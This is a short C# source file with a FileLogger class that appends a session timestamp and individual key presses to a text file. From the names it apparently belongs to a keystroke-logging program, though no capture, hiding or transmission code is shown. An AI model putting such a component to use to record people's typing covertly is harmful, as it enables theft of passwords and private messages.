﻿namespace Agente1
{
    public class FileLogger
    {
        private readonly string filePath;

        public FileLogger(string filePath)
        {
            this.filePath = filePath;
        }

        public void LogSessionStart()
        {
            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                sw.WriteLine();
                sw.WriteLine($"\nSession started at {DateTime.Now}\n");
            }
        }

        public void SaveKeyPress(string key)
        {
            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                sw.Write(key);
            }
        }

        public void SaveCurrentLine()
        {
            using (StreamWriter sw = new StreamWriter(filePath, true))
            {
                sw.WriteLine();
            }
        }
    }

}